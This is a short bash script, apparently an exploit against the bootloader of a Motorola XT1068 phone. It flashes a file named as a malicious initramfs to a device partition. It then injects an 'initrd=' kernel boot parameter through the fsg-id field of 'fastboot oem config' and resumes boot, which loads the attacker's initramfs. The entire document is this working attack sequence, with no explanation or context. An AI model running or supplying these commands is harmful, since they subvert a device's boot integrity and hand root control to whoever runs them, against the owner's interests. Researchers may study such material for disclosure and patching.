#!/bin/bash
FILE_NAME=initroot-xt1068-p64-MALICIOUS.cpio.gz;

fastboot flash aleph $FILE_NAME
sleep 4

fastboot oem config fsg-id "a initrd=0x15000000,833176"
sleep 2

fastboot continue
sleep 2

